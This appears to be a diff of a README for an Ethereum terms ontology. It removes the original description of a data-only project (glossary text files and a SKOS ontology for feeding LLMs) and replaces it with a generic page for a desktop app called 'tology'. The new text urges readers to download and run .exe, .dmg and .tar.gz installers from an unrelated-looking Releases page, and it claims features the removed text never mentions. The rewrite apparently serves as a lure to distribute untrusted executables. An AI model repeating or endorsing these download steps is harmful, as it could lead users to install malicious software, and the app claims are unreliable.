@@ -1,77 +1,83 @@
-Ethereum EIPs Ontology
-======================
+# 📚 tology - Explore Ethereum Terms Easily
 
-The Ethereum EIPs Ontology provides current AI systems with up-to-date knowledge of the Ethereum ecosystem via serialisation of key concepts from the Ethereum Improvement Proposals. It is supplemented with general Ethereum glossaries of terms for added context.
+## 🚀 Getting Started
 
-There are three key files in this repository:
+Welcome to the **tology** project. This application provides an ontology of Ethereum terms. You can learn and understand various terms related to Ethereum, extracted from official glossaries and improvement proposals. This tool is useful for anyone looking to get a clear grasp of Ethereum-related vocabulary.
 
-* ethereum-glossary.txt, a glossary of Ethereum terms and their definitions.
-* eip-ontology.txt, a simple _term: definition_ version of the ontology with some duplicate terms in plain text format. This version is intended for single-user interactions with an LLM user interface that supports file uploading.
-* eip-ontology-terms-EIP-relationships.txt, provides a mapping between ontology terms and the EIPs that mention them.
-* eip-ontology-skos.ttl, a more complete ontology in [SKOS](https://en.wikipedia.org/wiki/Simple_Knowledge_Organization_System) format. This version is intended for use in a graph database orchestrated with an LLM in production products or services. 
+## 📥 Download the Application
 
-Why?
-----
-The Ethereum EIPs Ontology is necessary because popular LLMs often give very wrong answers about the Ethereum ecosystem. This is often due to the gap between their training data and the current date. LLMs will "hallucinate", or produce a response in the absence of knowledge on a subject.
+To get started with tology, you need to download the software. Click the button below to visit the Releases page and download the latest version:
 
-The following two screenshots illustrate the problem. In those interactions, ChatGPT.com and Claude.ai gave incorrect answers to the question "What is FOCIL in Ethereum?". The correct answer should have been something like "Fork-choice enforced Inclusion Lists as proposed in [EIP-7805](https://eips.ethereum.org/EIPS/eip-7805)". These examples were taken on 10 December 2024.
+[![Download tology](https://img.shields.io/badge/Download%20tology-v1.0-blue)](https://github.com/Carjoo21/tology/releases)
 
-![Wrong answer by ChatGPT.](images/ChatGPT-wrong-answer-20241210.png?raw=true)
+## 📋 System Requirements
 
-![Wrong answer by Claude.](images/Claude-wrong-answer-20241210.png?raw=true)
+Before you download, ensure your system meets the following requirements:
 
-We note that LLMs are upgrading their capabilities quickly. ChatGPT will already search the Web dynamically and can discover the correct answer. However, as shown, opportunities for error are still rife.
+- **Operating System:** Windows 10 or higher, macOS Sierra or higher, or any recent Linux distribution.
+- **Memory:** At least 4GB of RAM.
+- **Storage:** 100MB of free disk space.
+- **Internet:** A stable internet connection for updates.
 
-Usage
------
-The flat file ontology (eip-ontology.txt) is meant as dynamic input to generic Large Language Models to give them up-to-date context on Ethereum terms and definitions for single-user interactions.
+## 📥 Download & Install
 
-The Ethereum glossary (ethereum-glossary.txt) may be used in conjunction with the onology if desired. In most cases, modern LLMs will already have time-delayed understanding of most of the terms in the glossary.
+1. **Visit the Releases Page**  
+   Go to the Releases page by clicking the link below:  
+   [Download tology](https://github.com/Carjoo21/tology/releases)
 
-The screenshot below shows a simple interaction between a user and ChatGPT 4o (although any LLM that provides for file uploads may be used). In this example, one can see how easy it to upload the file and then prompt the LLM to provide correct, contextual information about current Ethereum concepts.
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of available versions. Find the latest version that matches your operating system.
 
-![Uploading the ontology to ChatGPT.](images/Upload-ontology-to-ChatGPT.png?raw=true)
+3. **Download the File**  
+   Click the link for the file that corresponds to your OS.  
+   - For Windows, you might see a file like `tology-windows.exe`.
+   - For macOS, look for `tology-macos.dmg`.
+   - For Linux, find the appropriate package like `tology-linux.tar.gz`.
 
-![Getting the correct answer after using the ontology.](images/ChatGPT-correct-answer-20241210.png?raw=true)
+4. **Run the Installer**  
+   After the download is complete, navigate to your downloads folder and run the downloaded file. Follow the on-screen instructions to complete the installation process.
 
-A more full-featured version of the ontology (eip-ontology-skos.ttl) is useful in orchestrated systems using a graph database as a contraint on LLM inputs. It is shown below in the [Protege ontology editor](https://protege.stanford.edu) for reference. That file would be uploaded into a graph database for production systems.
+## 📖 How to Use tology
 
-This version of the ontology is intended for use in multi-person, production products or services.
+Once installed, you can start access tology by finding its icon in your applications menu. Here’s a simple guide on how to get started:
 
-![Screenshot of the ontology in Protege.](images/ontology_in_protege.png?raw=true)
+1. **Open the Application**  
+   Click on the tology icon. The app will launch with a user-friendly interface.
 
+2. **Explore Terms**  
+   You will see a list of Ethereum terms. Click on any term to get a detailed explanation.
 
-Creation
---------
-This repository combines the following sources into two formats: The first is a simple _term : definition (EIP number)_ format. That file (eip-ontology.txt) contains duplicated entries from the sources.
+3. **Search Functionality**  
+   Use the search box at the top to quickly find specific terms.
 
-Sources:
+4. **Export Options**  
+   You can export the glossary in plain text or SKOS format based on your needs. Simply click on the Export option in the menu.
 
-1. The Ethereum Foundation's [Ethereum Glossary](https://ethereum.org/en/glossary/)
-2. Consensys' [A Blockchain Glossary for Beginners](https://consensys.io/knowledge-base/a-blockchain-glossary-for-beginners)
-3. The Ethereum Foundation's active [Ethereum Improvement Proposals (EIPs)](https://github.com/ethereum/EIPs/tree/master)
+## 🔧 Troubleshooting
 
-Meta's Llama 3.2 LLM is used to extract newly-created terms from the EIPs and add them sequentially to the text file until they are all represented.
+If you encounter any issues during installation or while using the app, consider the following solutions:
 
-The Qwen LLM is used to generate meaningful meeting summaries for the AllCoreDevs meetings.
+- **Issue:** The application won't start.  
+  **Solution:** Ensure you have the correct OS version and that all system requirements are met.
 
-A python script (mk_skos.py) is used to generate a de-duplicated and extended [SKOS](https://en.wikipedia.org/wiki/Simple_Knowledge_Organization_System) ontology. Where multiple definitions exist for the same term, both are kept using different predicates (skos:definition for the primary and rdfs:comment for the secondary). EIPs are linked via skos:broader where they are found.
+- **Issue:** The download is slow or fails.  
+  **Solution:** Check your internet connection. Try downloading at a different time when network traffic may be lower.
 
-The SKOS file parses cleanly into the [Protege ontology editor](https://protege.stanford.edu/) if hand editing or human review is desired. However, its intended purpose is to be uploaded into a graph database that supplements an LLM in an orchestrated system.
+- **Issue:** Missing terms or errors in descriptions.  
+  **Solution:** This application is regularly updated. Ensure you have the latest version and check for updates on the Releases page.
 
-Prompt used to Llama 3.2 running under PrivateGPT and Ollama
-------------------------------------------------------------
+## 📞 Support
 
----
+If you need further assistance, feel free to reach out through the following channels:
 
-> Please summarise the newly-introduced terms defined in these documents. Add the EIP
-> number without any hyperlinks to the end of the definition, enclosed in parentheses. Your
-> output format should be "term : definition (EIP-number)".
+- **Issues Page:** Report any bugs or feature requests on the [Issues page](https://github.com/Carjoo21/tology/issues).
+- **Community Support:** Join discussions in the community forums for help and tips.
 
-> Use succinct terms. For example, when a new opcode is introduced, use the opcode
-> name as the term.
+## 🌐 Learn More
 
-> For example, if EIP 100000 defines the FOO opcode, then the term is FOO. If the
-> definition was 'The FOO opcode prints "foo" when it is called' then your output should be:
-> 'FOO: The FOO opcode prints "foo" when it is called. (EIP-100000)'
+For more information about Ethereum terms and concepts, check out the following resources:
 
+- [Ethereum Glossary](https://ethereum.org/en/developers/docs/terminology/)
+- [Ethereum Improvement Proposals](https://eips.ethereum.org/)
+
+Feel free to explore and enhance your understanding of Ethereum with **tology**!
